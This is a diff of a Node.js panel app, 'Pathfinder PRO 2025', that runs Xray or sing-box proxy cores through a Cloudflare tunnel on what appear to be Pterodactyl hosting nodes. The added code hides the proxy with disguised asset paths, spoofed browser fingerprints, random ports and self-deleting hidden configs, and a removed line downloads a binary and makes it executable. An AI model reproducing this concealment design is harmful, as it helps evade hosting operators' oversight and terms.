+    if (sinboxProcess) { try { sinboxProcess.kill('SIGKILL'); } catch(e) {} sinboxProcess = null; }
+    if (xrayConfigDeleteTimer) { clearTimeout(xrayConfigDeleteTimer); xrayConfigDeleteTimer = null; }
+
     if (isProxyStopped) return;
     
-    currentNodeInfo = { type, uuid };
+    currentNodeInfo = { coreType, type, uuid };
+    initProxyEnvironment(); 
+
+    // >>> 生成随机内部端口 (关键修改) <<<
+    currentInternalPort = getRandomPort();
+    // console.log(`[Proxy] Assigned Random Port: ${currentInternalPort}`); 
+
+    // 生成随机路径和指纹
+    const randomHash = crypto.randomBytes(6).toString('hex');
+    currentWsPath = `/static/assets/${randomHash}.js`; 
+    const fingerprint = getRandomFingerprint();
+    const isWin = os.platform() === 'win32';
+
+    // ================= 配置生成区 =================
+    let configString = "";
     
-    // 确保文件存在
-    initProxyEnvironment();
-    
-    if (!fsSync.existsSync(xrayPath)) {
-        // 尝试重新下载
-        try {
-            execSync(`curl -L -s https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o x.zip && unzip -o x.zip xray && mv xray ${xrayName} && chmod +x ${xrayName} && rm -f x.zip`, { stdio: 'ignore' });
-        } catch (e) {
-            return;
-        }
-    }
-    
-    const cfg = {
-        inbounds: [{
-            port: 20001, listen: "127.0.0.1", protocol: type,
-            settings: (type === 'vmess' || type === 'vless') ? 
-                { clients: [{ id: uuid }], decryption: "none" } : { clients: [{ password: uuid }] },
-            streamSettings: { network: "ws", wsSettings: { path: `/${type}` } }
-        }],
-        outbounds: [{ protocol: "freedom" }]
-    };
-    
-    try {
-        fsSync.writeFileSync('xray_config.json', JSON.stringify(cfg));
-        
-        // 设置1分钟后删除xray_config.json
-        xrayConfigDeleteTimer = setTimeout(() => {
-            try {
-                if (fsSync.existsSync('xray_config.json')) {
-                    fsSync.unlinkSync('xray_config.json');
+    if (coreType === 'sinbox') {
+        // Sing-box 配置
+        const sbConfig = {
+            "log": { "level": "error", "timestamp": true },
+            "inbounds": [
+                {
+                    "type": type, 
+                    "tag": "in-0",
+                    "listen": "127.0.0.1",
+                    "listen_port": currentInternalPort, // 使用随机端口
+                    "users": [], 
+                    "transport": {
+                        "type": "ws",
+                        "path": currentWsPath,
+                        "headers": {
+                            "User-Agent": fingerprint.ua
+                        }
+                    }
                 }
-                xrayConfigDeleteTimer = null;
-            } catch (err) {
-                // 静默删除失败
+            ],
+            "outbounds": [{ "type": "direct", "tag": "out-0" }]
+        };
+
+        if (type === 'vmess') sbConfig.inbounds[0].users.push({ "uuid": uuid, "alterId": 0, "name": "user" });
+        else if (type === 'vless') sbConfig.inbounds[0].users.push({ "uuid": uuid, "flow": "", "name": "user" });
+        else if (type === 'trojan') sbConfig.inbounds[0].users.push({ "password": uuid, "name": "user" });
+
+        configString = JSON.stringify(sbConfig, null, 2);
+
+    } else {
+        // Xray 配置
+        const xrayConfig = {
+            log: { loglevel: "none", access: "none", error: "none" },
+            inbounds: [{
+                port: currentInternalPort, // 使用随机端口
+                listen: "127.0.0.1",
+                protocol: type,
+                settings: (type === 'vmess' || type === 'vless') ?
+                    { clients: [{ id: uuid }], decryption: "none" } : 
+                    { clients: [{ password: uuid }] },
+                streamSettings: {
+                    security: "none", 
+                    network: "ws",
+                    wsSettings: {
+                        path: currentWsPath,
+                        headers: {
+                            "User-Agent": fingerprint.ua,
+                            "Sec-CH-UA": fingerprint.ch_ua,
+                            "Sec-CH-UA-Mobile": fingerprint.mobile,
+                            "Sec-CH-UA-Platform": `"${fingerprint.platform}"`
+                        }
+                    }
+                }
+            }],
+            outbounds: [{ protocol: "freedom" }]
+        };
+        configString = JSON.stringify(xrayConfig);
+    }
+
+    // ================= 启动进程区 =================
+    let targetBinaryPath = (coreType === 'sinbox') ? sinboxPath : xrayPath;
+    let currentProcessRef = null;
+
+    if (!fsSync.existsSync(targetBinaryPath)) {
+        console.error(`[Proxy] Error: Binary not found at ${targetBinaryPath}`);
+        return;
+    }
+
+    try {
+        if (isWin) {
+            const args = (coreType === 'sinbox') ? ['run', '-c', 'stdin:'] : ['-c', 'stdin:'];
+            currentProcessRef = spawn(`./${path.basename(targetBinaryPath)}`, args, {
+                cwd: PROXY_DIR,
+                stdio: ['pipe', 'ignore', 'ignore'],
+                windowsHide: true
+            });
+            if (currentProcessRef.stdin) {
+                currentProcessRef.stdin.write(configString);
+                currentProcessRef.stdin.end();
             }
-        }, 60000); // 1分钟 = 60000毫秒
-        
-        xrayProcess = spawn(`./${xrayName}`, ['-c', 'xray_config.json'], { stdio: 'ignore' });
-        
-        xrayProcess.on('exit', (code) => {
-            xrayProcess = null;
-            // 如果进程退出，也清除定时器
-            if (xrayConfigDeleteTimer) {
-                clearTimeout(xrayConfigDeleteTimer);
-                xrayConfigDeleteTimer = null;
-            }
-            if (!isProxyStopped) {
-                setTimeout(() => {
-                    startXray(type, uuid);
-                }, 5000);
+        } else {
+            const memConfigPath = path.join('/dev/shm', `.${randomHash}.json`);
+            const finalConfigPath = fsSync.existsSync('/dev/shm') ? memConfigPath : path.join(__dirname, `.${randomHash}.json`);
+            fsSync.writeFileSync(finalConfigPath, configString, { mode: 0o600 });
+            
+            const args = (coreType === 'sinbox') ? ['run', '-c', finalConfigPath] : ['-c', finalConfigPath];
+            currentProcessRef = spawn(`./${path.basename(targetBinaryPath)}`, args, {
+                cwd: PROXY_DIR,
+                stdio: 'ignore'
+            });
+            
+            setTimeout(() => {
+                try { if (fsSync.existsSync(finalConfigPath)) fsSync.unlinkSync(finalConfigPath); } catch(e) {}
+            }, 1500);
+        }
+
+        if (coreType === 'sinbox') sinboxProcess = currentProcessRef;
+        else xrayProcess = currentProcessRef;
+
+        currentProcessRef.on('exit', (code) => {
+            if (!isProxyStopped && code !== 0 && code !== null) {
+                const isSinbox = currentNodeInfo.coreType === 'sinbox';
+                if (isSinbox) sinboxProcess = null; else xrayProcess = null;
+                console.log(`[Proxy] Core exited (${code}), restarting...`);
+                setTimeout(() => { startProxyCore(coreType, type, uuid); }, 5000);
+            } else {
+                if (coreType === 'sinbox') sinboxProcess = null; else xrayProcess = null;
             }
         });
-    } catch (err) {
-        // 静默失败
-    }
+        
+    } catch (err) { console.error('[Proxy] Start Core Error:', err); }
 }
 
-// 修复：改进的stopProxy函数
+// 停止代理
 function stopProxy() {
     isProxyStopped = true;
+    if (xrayConfigDeleteTimer) { clearTimeout(xrayConfigDeleteTimer); xrayConfigDeleteTimer = null; }
     
-    // 清除删除定时器
-    if (xrayConfigDeleteTimer) {
-        clearTimeout(xrayConfigDeleteTimer);
-        xrayConfigDeleteTimer = null;
-    }
+    if (xrayProcess) { try { xrayProcess.kill('SIGKILL'); } catch(e) {} xrayProcess = null; }
+    if (sinboxProcess) { try { sinboxProcess.kill('SIGKILL'); } catch(e) {} sinboxProcess = null; }
+    if (cfProcess) { try { cfProcess.kill('SIGKILL'); } catch(e) {} cfProcess = null; }
     
-    if (xrayProcess) { 
-        try {
-            xrayProcess.kill('SIGKILL');
-        } catch(e) {}
-        xrayProcess = null; 
-    }
-    
-    if (cfProcess) {
-        try {
-            cfProcess.kill('SIGKILL');
-        } catch(e) {}
-        cfProcess = null;
-    }
-    
-    // 尝试删除xray_config.json
-    try {
-        if (fsSync.existsSync('xray_config.json')) {
-            fsSync.unlinkSync('xray_config.json');
-        }
-    } catch (e) {}
+    try { if (fsSync.existsSync('xray_config.json')) fsSync.unlinkSync('xray_config.json'); } catch (e) {}
 }
 
-// 修复：改进的uninstallProxy函数
+// 卸载代理
 function uninstallProxy() {
-    // 清除删除定时器
-    if (xrayConfigDeleteTimer) {
-        clearTimeout(xrayConfigDeleteTimer);
-        xrayConfigDeleteTimer = null;
-    }
-    
-    // 停止所有进程
+    if (xrayConfigDeleteTimer) { clearTimeout(xrayConfigDeleteTimer); xrayConfigDeleteTimer = null; }
     stopProxy();
     
-    // 清理文件
-    const files = fsSync.readdirSync(__dirname);
-    files.forEach(f => {
-        if (f.startsWith('x_') || f.startsWith('c_') || f === 'xray_config.json') {
-            try { 
-                fsSync.unlinkSync(f); 
-            } catch(e) {}
-        }
-    });
+    if (fsSync.existsSync(PROXY_DIR)) {
+        const files = fsSync.readdirSync(PROXY_DIR);
+        files.forEach(f => {
+            if (f.startsWith('x_') || f.startsWith('s_') || f.startsWith('c_')) {
+                try { fsSync.unlinkSync(path.join(PROXY_DIR, f)); } catch(e) {}
+            }
+        });
+    }
+    try { if (fsSync.existsSync('xray_config.json')) fsSync.unlinkSync('xray_config.json'); } catch (e) {}
     
-    // 重置文件名，这样下次启动时会重新生成
-    xrayName = null;
-    cfName = null;
-    xrayPath = null;
-    cfPath = null;
-    currentNodeInfo = { type: '', uuid: '' };
+    xrayName = null; sinboxName = null; cfName = null;
+    xrayPath = null; sinboxPath = null; cfPath = null;
+    currentNodeInfo = { type: '', uuid: '', coreType: 'xray' };
     tunnelUrl = "";
 }
 
-// 创建代理服务器
+// 创建代理服务器 (对接随机端口)
 function createProxyServer() {
     const proxyServer = http.createServer((req, res) => {
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
         res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
         
-        if (req.method === 'OPTIONS') {
-            res.writeHead(200);
-            res.end();
-            return;
-        }
+        if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }
         
         if (req.url === '/api/deploy' && req.method === 'POST') {
             let body = '';
@@ -3157,7 +2626,7 @@ function createProxyServer() {
             req.on('end', () => {
                 try {
                     const data = JSON.parse(body);
-                    startXray(data.type, data.uuid);
+                    startProxyCore(data.coreType || 'xray', data.type, data.uuid);
                     res.writeHead(200, { 'Content-Type': 'application/json' });
                     res.end(JSON.stringify({ success: true, tunnel: tunnelUrl }));
                 } catch (e) {
@@ -3167,27 +2636,24 @@ function createProxyServer() {
             });
         } else if (req.url === '/api/stop' && req.method === 'POST') {
             stopProxy();
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ success: true }));
+            res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true }));
         } else if (req.url === '/api/start' && req.method === 'POST') {
             startProxy();
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ success: true }));
+            res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true }));
         } else if (req.url === '/api/status' && req.method === 'POST') {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ 
                 tunnel: tunnelUrl, 
-                running: !!xrayProcess, 
+                running: !!xrayProcess || !!sinboxProcess, 
                 cfRunning: !!cfProcess,
-                info: currentNodeInfo 
+                info: currentNodeInfo,
+                wsPath: currentWsPath 
             }));
         } else if (req.url === '/api/uninstall' && req.method === 'POST') {
             uninstallProxy();
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ success: true }));
+            res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true }));
         } else {
-            res.writeHead(404);
-            res.end('Not Found');
+            res.writeHead(404); res.end('Not Found');
         }
     });
 
@@ -3195,8 +2661,11 @@ function createProxyServer() {
     
     proxyServer.on('upgrade', (req, socket, head) => {
         const pathName = req.url.split('?')[0];
-        if (['/vmess', '/vless', '/trojan', '/shadowsocks'].includes(pathName)) {
-            const target = new WebSocket(`ws://127.0.0.1:20001${pathName}`);
+
+        if (pathName === currentWsPath) {
+            // >>> 使用当前随机端口连接内部核心 <<<
+            const target = new WebSocket(`ws://127.0.0.1:${currentInternalPort}${pathName}`);
+            
             proxyWss.handleUpgrade(req, socket, head, (ws) => {
                 target.on('open', () => {
                     const s1 = WebSocket.createWebSocketStream(ws);
@@ -3206,10 +2675,12 @@ function createProxyServer() {
                 });
                 target.on('error', () => socket.destroy());
             });
-        } else socket.destroy();
+        } else {
+            socket.destroy();
+        }
     });
 
-    return proxyServer;
+  return proxyServer;
 }
 
 // ========== API 路由 ==========
@@ -3273,15 +2744,23 @@ app.post('/api/auth/logout', (req, res) => {
     });
 });
 
-// ========== 代理服务器路由 ==========
+// ========== 代理服务器路由 (支持 coreType) ==========
 app.post('/api/proxy/deploy', requireAuth, (req, res) => {
-    try {
-        const { type, uuid } = req.body;
-        startXray(type, uuid);
-        res.json({ success: true, tunnel: tunnelUrl });
-    } catch (err) {
-        res.status(500).json({ success: false, message: err.message });
-    }
+  try {
+    const { type, uuid, coreType } = req.body; // 接收 coreType
+
+    // 调用 startProxyCore，这会生成并设置 currentWsPath
+    startProxyCore(coreType || 'xray', type, uuid);
+
+    // 必须把后端生成的动态路径(wsPath)返回给前端
+    res.json({
+      success: true,
+      tunnel: tunnelUrl,
+      wsPath: currentWsPath
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
 });
 
 app.post('/api/proxy/stop', requireAuth, (req, res) => {
@@ -3294,12 +2773,14 @@ app.post('/api/proxy/start', requireAuth, (req, res) => {
     res.json({ success: true });
 });
 
+// ========== 修复：状态查询接口 (新增返回 wsPath) ==========
 app.post('/api/proxy/status', requireAuth, (req, res) => {
     res.json({ 
         tunnel: tunnelUrl, 
-        running: !!xrayProcess, 
+        running: !!xrayProcess || !!sinboxProcess, 
         cfRunning: !!cfProcess,
-        info: currentNodeInfo 
+        info: currentNodeInfo,
+        wsPath: currentWsPath 
     });
 });
 
@@ -3308,14 +2789,14 @@ app.post('/api/proxy/uninstall', requireAuth, (req, res) => {
     res.json({ success: true });
 });
 
-// 代理服务器页面
+// 代理服务器页面 (包含核心选择器)
 app.get('/proxy', requireAuth, (req, res) => {
     res.send(`
     <!DOCTYPE html><html><head><meta charset="utf-8">
     <script src="https://cdn.tailwindcss.com"></script>
     <title>Pathfinder 代理服务器</title>
     <style>
-        body { background: #0b0e14; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; }
+        body { background: #0b0e14; color: #c9d1d9; font-family: sans-serif; }
         .glass { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
         .btn { transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; }
         .btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
@@ -3333,7 +2814,7 @@ app.get('/proxy', requireAuth, (req, res) => {
                 <div class="flex justify-between items-center mb-6">
                     <div>
                         <h1 class="text-blue-500 font-black text-2xl italic tracking-tighter">PATHFINDER PROXY</h1>
-                        <p class="text-[10px] text-gray-500 font-mono mt-1">Xray + Cloudflare 隧道管理器</p>
+                        <p class="text-[10px] text-gray-500 font-mono mt-1">Xray/Sinbox + Cloudflare 隧道管理器</p>
                     </div>
                     <div id="status_tag" class="px-3 py-1 rounded-full text-[10px] font-bold bg-red-500/10 text-red-500 border border-red-500/20">已停止</div>
                 </div>
@@ -3342,10 +2823,10 @@ app.get('/proxy', requireAuth, (req, res) => {
                 <div class="bg-black/40 p-4 rounded-2xl border border-white/5 mb-6">
                     <div class="space-y-2">
                         <div class="flex justify-between items-center">
-                            <span class="text-[10px] text-gray-400 uppercase font-bold">Xray 核心</span>
+                            <span class="text-[10px] text-gray-400 uppercase font-bold">代理核心</span>
                             <div class="flex items-center">
-                                <span id="xray_status_dot" class="status-dot status-stopped"></span>
-                                <span id="xray_status_text" class="text-[10px] font-bold text-red-500">未运行</span>
+                                <span id="core_status_dot" class="status-dot status-stopped"></span>
+                                <span id="core_status_text" class="text-[10px] font-bold text-red-500">未运行</span>
                             </div>
                         </div>
                         <div class="flex justify-between items-center">
@@ -3369,8 +2850,17 @@ app.get('/proxy', requireAuth, (req, res) => {
 
                 <!-- 控制台表单 -->
                 <div class="space-y-4">
+                    <!-- 新增：核心类型选择 -->
                     <div>
-                        <label class="text-[10px] text-gray-500 uppercase font-bold ml-1">节点协议</label>
+                        <label class="text-[10px] text-gray-400 uppercase font-bold ml-1">核心类型</label>
+                        <select id="core-type" class="w-full bg-black/60 p-4 rounded-2xl border border-white/10 outline-none text-purple-400 font-bold focus:border-purple-500/50 transition-all mt-1">
+                            <option value="xray">Xray (默认)</option>
+                            <option value="sinbox">Sinbox (实验性)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="text-[10px] text-gray-400 uppercase font-bold ml-1">节点协议</label>
                         <select id="t" class="w-full bg-black/60 p-4 rounded-2xl border border-white/10 outline-none text-blue-400 font-bold focus:border-blue-500/50 transition-all mt-1">
                             <option value="vless">VLESS (推荐)</option>
                             <option value="vmess">VMess</option>
@@ -3379,7 +2869,7 @@ app.get('/proxy', requireAuth, (req, res) => {
                     </div>
 
                     <div>
-                        <label class="text-[10px] text-gray-500 uppercase font-bold ml-1">UUID / 密码</label>
+                        <label class="text-[10px] text-gray-400 uppercase font-bold ml-1">UUID / 密码</label>
                         <input id="u" value="${crypto.randomUUID()}" class="w-full bg-black/60 p-4 rounded-2xl border border-white/10 outline-none font-mono text-xs focus:border-blue-500/50 mt-1">
                     </div>
 
@@ -3402,11 +2892,12 @@ app.get('/proxy', requireAuth, (req, res) => {
                 </div>
             </div>
             
-            <p class="text-center text-[9px] text-gray-600 uppercase tracking-widest">Pterodactyl Node System • Random Binary Active</p>
+            <p class="text-center text-[9px] text-gray-600 uppercase tracking-widest">Pterodactyl Node System • Multi-Core Active</p>
         </div>
 
         <script>
             let domain = "";
+            let globalWsPath = ""; 
 
             async function checkStatus() {
                 try {
@@ -3416,6 +2907,10 @@ app.get('/proxy', requireAuth, (req, res) => {
                     });
                     const d = await r.json();
                     
+                    if(d.wsPath) {
+                        globalWsPath = d.wsPath;
+                    }
+
                     if(d.tunnel) {
                         domain = d.tunnel;
                         document.getElementById('tunnel_domain').innerText = d.tunnel;
@@ -3423,18 +2918,20 @@ app.get('/proxy', requireAuth, (req, res) => {
                         document.getElementById('tunnel_state').className = "text-emerald-500";
                     }
                     
-                    const xrayStatusDot = document.getElementById('xray_status_dot');
-                    const xrayStatusText = document.getElementById('xray_status_text');
+                    // 更新核心状态点
+                    const coreStatusDot = document.getElementById('core_status_dot');
+                    const coreStatusText = document.getElementById('core_status_text');
                     if(d.running) {
-                        xrayStatusDot.className = "status-dot status-running";
-                        xrayStatusText.innerText = "运行中";
-                        xrayStatusText.className = "text-[10px] font-bold text-emerald-500";
+                        coreStatusDot.className = "status-dot status-running";
+                        coreStatusText.innerText = "运行中";
+                        coreStatusText.className = "text-[10px] font-bold text-emerald-500";
                     } else {
-                        xrayStatusDot.className = "status-dot status-stopped";
-                        xrayStatusText.innerText = "未运行";
-                        xrayStatusText.className = "text-[10px] font-bold text-red-500";
+                        coreStatusDot.className = "status-dot status-stopped";
+                        coreStatusText.innerText = "未运行";
+                        coreStatusText.className = "text-[10px] font-bold text-red-500";
                     }
                     
+                    // 更新 CF 状态点
                     const cfStatusDot = document.getElementById('cf_status_dot');
                     const cfStatusText = document.getElementById('cf_status_text');
                     if(d.cfRunning) {
@@ -3467,6 +2964,7 @@ app.get('/proxy', requireAuth, (req, res) => {
             async function op(type) {
                 const t = document.getElementById('t').value;
                 const u = document.getElementById('u').value;
+                const coreType = document.getElementById('core-type').value; // 获取核心类型
                 
                 if(type === 'deploy' && !domain) {
                     alert("请等待隧道域名分配...");
@@ -3479,7 +2977,8 @@ app.get('/proxy', requireAuth, (req, res) => {
                         r = await fetch('/api/proxy/' + type, {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ type: t, uuid: u })
+                            // 发送 coreType
+                            body: JSON.stringify({ type: t, uuid: u, coreType: coreType })
                         });
                     } else {
                         r = await fetch('/api/proxy/' + type, {
@@ -3491,9 +2990,9 @@ app.get('/proxy', requireAuth, (req, res) => {
                     const data = await r.json();
                     if(data.success) {
                         if(type === 'deploy') {
-                            gen(t, u);
+                            gen(t, u, data.tunnel, data.wsPath);
                         }
-                        checkStatus();
+                        checkStatus(); 
                     } else {
                         alert(data.message || '操作失败');
                     }
@@ -3502,18 +3001,26 @@ app.get('/proxy', requireAuth, (req, res) => {
                 }
             }
 
-            function gen(type, uuid) {
-                const host = domain;
-                const path = "/" + type;
+            function gen(type, uuid, host, wsPath) {
+                let finalPath = wsPath || globalWsPath;
+                if (!finalPath) finalPath = "/"; 
+
+                const finalHost = host || domain;
                 let s = "";
+                
                 if(type === 'vmess') {
-                    const v = { v:"2", ps:"CF-VMess", add:host, port:"443", id:uuid, aid:"0", net:"ws", type:"none", path:path, tls:"tls", sni:host, host:host };
+                    const v = { 
+                        v:"2", ps:"CF-VMess", add:finalHost, port:"443", id:uuid, aid:"0", 
+                        net:"ws", type:"none", path:finalPath, 
+                        tls:"tls", sni:finalHost, host:finalHost 
+                    };
                     s = "vmess://" + btoa(JSON.stringify(v));
                 } else if(type === 'vless') {
-                    s = "vless://" + uuid + "@" + host + ":443?type=ws&security=tls&path=" + encodeURIComponent(path) + "&sni=" + host + "&host=" + host + "#CF-VLESS";
-                } else if(type === 'trojan') {
-                    s = "trojan://" + uuid + "@" + host + ":443?type=ws&security=tls&path=" + encodeURIComponent(path) + "&sni=" + host + "&host=" + host + "#CF-Trojan";
+                    s = "vless://" + uuid + "@" + finalHost + ":443?type=ws&security=tls&path=" + encodeURIComponent(finalPath) + "&sni=" + finalHost + "&host=" + finalHost + "#CF-VLESS";
+                } else if (type === 'trojan') {
+                    s = "trojan://" + uuid + "@" + finalHost + ":443?type=ws&security=tls&path=" + encodeURIComponent(finalPath) + "&sni=" + finalHost + "&host=" + finalHost + "#CF-TROJAN";
                 }
+                
                 document.getElementById('res_area').classList.remove('hidden');
                 document.getElementById('link').value = s;
             }
@@ -3534,13 +3041,12 @@ app.get('/proxy', requireAuth, (req, res) => {
                 }
             }
 
-            // 初始化
             checkStatus();
         </script>
     </body></html>`);
 });
 
-// ========== 主面板页面 ==========
+// ========== 主面板页面 (HTML部分太长，包含代理设置弹窗更新) ==========
 app.get('/dashboard', requireAuth, (req, res) => {
     res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Pathfinder PRO 2025 (增强版任务中心 + 哪吒探针 + 代理服务器)</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -3660,6 +3166,61 @@ app.get('/dashboard', requireAuth, (req, res) => {
         margin-top: 1rem; 
     }
     
+    .system-modal { 
+        background: rgba(15, 23, 42, 0.95); 
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 20px;
+    }
+    .system-option-btn {
+        width: 100%;
+        text-align: left;
+        background: rgba(30, 41, 59, 0.6);
+        border: 1px solid rgba(71, 85, 105, 0.4);
+        color: #f8fafc;
+        padding: 1rem;
+        border-radius: 12px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        margin-bottom: 0.75rem;
+    }
+    .system-option-btn:hover {
+        background: rgba(30, 41, 59, 0.9);
+        border-color: rgba(59, 130, 246, 0.6);
+    }
+    .system-option-btn.active {
+        background: rgba(59, 130, 246, 0.2);
+        border-color: #3b82f6;
+    }
+    .system-option-content {
+        display: none;
+        background: rgba(15, 23, 42, 0.5);
+        border: 1px solid rgba(71, 85, 105, 0.3);
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin-top: 0.75rem;
+        margin-bottom: 1rem;
+    }
+    .system-option-content.open {
+        display: block;
+        animation: slideIn 0.2s ease-out;
+    }
+    .system-critical-btn {
+        border-color: rgba(239, 68, 68, 0.5);
+        color: #f87171;
+    }
+    .system-critical-btn:hover {
+        background: rgba(239, 68, 68, 0.1);
+        border-color: #ef4444;
+    }
+    .system-critical-btn.active {
+        background: rgba(239, 68, 68, 0.2);
+        border-color: #ef4444;
+    }
+    
     .logout-btn {
         background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
         border: none;
@@ -3763,7 +3324,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
         <header class="flex justify-between items-center mb-8">
             <div>
                 <h1 class="text-3xl font-black text-blue-500 italic uppercase">Pathfinder PRO 2025</h1>
-                <p class="text-sm text-slate-400 mt-1">增强版任务中心 | Discord消息 | Pteranodon控制 | 哪吒探针V1 | 代理服务器 | Cookie相似度检测</p>
+                <p class="text-sm text-slate-400 mt-1">增强版任务中心 | Discord消息 | Pteranodon控制 | 哪吒探针V1 | 多核代理服务器 | Cookie相似度检测</p>
             </div>
             <div class="glass p-2 rounded-xl flex gap-2">
                 <button onclick="logout()" class="logout-btn">
@@ -3785,6 +3346,10 @@ app.get('/dashboard', requireAuth, (req, res) => {
                     <i class="fas fa-server"></i>
                     代理服务器
                 </button>
+                <button onclick="showSystemModal()" class="btn-action bg-gray-700 px-4 py-1 rounded-xl text-sm font-bold flex items-center gap-1">
+                    <i class="fas fa-cogs"></i>
+                    系统功能
+                </button>
                 <div class="h-6 border-l border-slate-700"></div>
                 <input id="h" placeholder="IP:端口" class="rounded-xl px-4 py-1 text-sm outline-none w-40">
                 <input id="u" placeholder="角色名" class="rounded-xl px-4 py-1 text-sm outline-none w-32">
@@ -3800,7 +3365,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
             <div id="list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8"></div>
         </div>
         
-        <!-- 任务中心页面（增强版） -->
+        <!-- 任务中心页面 -->
         <div id="task-center-page" class="hidden">
             <div class="flex flex-col lg:flex-row gap-6 h-[calc(100vh-12rem)]">
                 <!-- 左侧面板 -->
@@ -3835,9 +3400,9 @@ app.get('/dashboard', requireAuth, (req, res) => {
                 </div>
                 
                 <!-- 主内容区域 -->
-                <div class="lg:w-2/3 flex flex-col">
+                <div class="lg:w-2/3 flex flex-col h-[calc(100vh-12rem)] overflow-hidden">
                     <!-- 任务详情 -->
-                    <div class="bg-slate-900/50 rounded-2xl p-4 border border-slate-800 mb-4">
+                    <div class="bg-slate-900/50 rounded-2xl p-4 border border-slate-800 mb-4 overflow-y-auto max-h-[50%]">
                         <div class="flex justify-between items-center mb-4">
                             <h3 id="selected-task-title" class="text-lg font-bold text-slate-300">选择任务以查看详情</h3>
                             <div id="task-controls" class="flex gap-2 hidden">
@@ -3931,7 +3496,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                                         <input id="task-config-minutes" type="number" min="0" value="0" class="time-input" placeholder="0" onchange="updateTaskConfig('minutes', this.value)">
                                         <span class="time-label">分钟</span>
                                     </div>
-                                                          <div class="time-input-group">
+                                    <div class="time-input-group">
                                         <input id="task-config-hours" type="number" min="0" value="0" class="time-input" placeholder="0" onchange="updateTaskConfig('hours', this.value)">
                                         <span class="time-label">小时</span>
                                     </div>
@@ -3941,29 +3506,27 @@ app.get('/dashboard', requireAuth, (req, res) => {
                                     </div>
                                 </div>
                                 <div class="text-xs text-slate-400 text-center">
-                                    总间隔: <span id="total-interval" class="text-emerald-400">0分钟</span>
+                                    总间隔: <span id="total-interval"class="text-emerald-400">0分钟</span></div>
                                 </div>
-                            </div>
-                            
-                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                                <div>
-                                    <label class="block text-sm text-slate-400 mb-1">执行间隔(分钟)</label>
-                                    <input id="task-config-interval" type="number" min="1" value="5" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" onchange="updateTaskConfig('interval', this.value)">
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                                    <div>
+                                        <label class="block text-sm text-slate-400 mb-1">执行间隔(分钟)</label>
+                                        <input id="task-config-interval" type="number" min="1" value="5" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" onchange="updateTaskConfig('interval', this.value)">
+                                    </div>
+                                    <div>
+                                        <label class="block text-sm text-slate-400 mb-1">最后运行</label>
+                                        <input id="task-config-lastrun" type="text" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" readonly>
+                                    </div>
+                                    <div>
+                                        <label class="block text-sm text-slate-400 mb-1">下次运行</label>
+                                        <input id="task-config-nextrun" type="text" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" readonly>
+                                    </div>
                                 </div>
-                                <div>
-                                    <label class="block text-sm text-slate-400 mb-1">最后运行</label>
-                                    <input id="task-config-lastrun" type="text" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" readonly>
-                                </div>
-                                <div>
-                                    <label class="block text-sm text-slate-400 mb-1">下次运行</label>
-                                    <input id="task-config-nextrun" type="text" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" readonly>
-                                </div>
-                            </div>
-                        </div>
+                                                   </div>
                     </div>
                     
                     <!-- 任务日志 -->
-                    <div class="flex-1 bg-slate-900/50 rounded-2xl p-4 border border-slate-800 overflow-hidden flex flex-col">
+                    <div class="flex-1 bg-slate-900/50 rounded-2xl p-4 border border-slate-800 overflow-hidden flex flex-col min-h-0">
                         <div class="flex justify-between items-center mb-4">
                             <h3 class="text-lg font-bold text-slate-300">任务日志</h3>
                             <div class="flex gap-2">
@@ -3973,27 +3536,27 @@ app.get('/dashboard', requireAuth, (req, res) => {
                                 </button>
                             </div>
                         </div>
-                        <div id="task-log-content" class="flex-1 bg-black/40 rounded-xl p-4 overflow-y-auto font-mono text-sm">
+                        <div id="task-log-content" class="flex-1 bg-black/40 rounded-xl p-4 overflow-y-auto font-mono text-sm min-h-0">
                             <div class="text-slate-500">选择一个任务查看日志</div>
                         </div>
                     </div>
                 </div>
             </div>
+        </div>
+        
+        <!-- 底部任务栏 -->
+        <div class="fixed bottom-4 right-4">
